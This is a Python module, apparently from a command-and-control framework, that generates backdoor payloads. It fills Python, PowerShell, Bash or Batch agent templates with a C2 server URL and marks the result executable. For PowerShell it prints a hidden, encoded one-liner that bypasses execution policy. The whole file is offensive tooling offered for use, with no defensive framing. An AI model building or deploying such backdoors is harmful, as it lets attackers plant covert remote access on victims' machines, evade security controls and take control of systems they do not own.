import os
import shutil


def generate_backdoor(agent_path, output_path, c2_url):
    if not os.path.exists(agent_path):
        print(f"[!] Agent script not found: {agent_path}")
        return

    with open(agent_path, "r") as f:
        content = f.read()

    content = content.replace("C2_SERVER_URL", c2_url)

    with open(output_path, "w") as f:
        f.write(content)

    os.chmod(output_path, 0o755)
    print(f"[+] Backdoor generated: {output_path}")
    print(f"[+] C2 URL: {c2_url}")

    ext = os.path.splitext(output_path)[1].lower()
    if ext == ".ps1":
        print("[*] Payload type: PowerShell")
        b64 = __import__("base64")
        ps_command = f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64.b64encode(content.encode("utf-16le")).decode()}'
        print(f"[*] One-liner: {ps_command}")
    elif ext == ".py":
        print("[*] Payload type: Python")
        print(f"[*] Run: python3 {output_path}")
    elif ext == ".sh":
        print("[*] Payload type: Bash")
        print(f"[*] Run: bash {output_path}")
    elif ext == ".bat":
        print("[*] Payload type: Batch")
        print(f"[*] Run: {output_path}")


def backdoor_menu(c2_url):
    print("=== Backdoor Generator ===")
    print("1. Generate Python payload")
    print("2. Generate PowerShell payload")
    print("3. Generate Bash payload")
    print("4. Generate Batch payload")
    choice = input("Choice: ").strip()

    templates = {
        "1": ("agent/agent.py", "payload.py"),
        "2": ("agent/agent.ps1", "payload.ps1"),
        "3": ("agent/agent.sh", "payload.sh"),
        "4": ("agent/agent.bat", "payload.bat"),
    }

    if choice not in templates:
        print("[!] Invalid choice")
        return

    src_name, out_name = templates[choice]
    src_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), src_name)
    out_path = os.path.join(os.getcwd(), out_name)

    if not os.path.exists(src_path):
        print(f"[!] Template not found: {src_path}")
        print("[*] Use 'generate agent' first or create template")
        return

    generate_backdoor(src_path, out_path, c2_url)
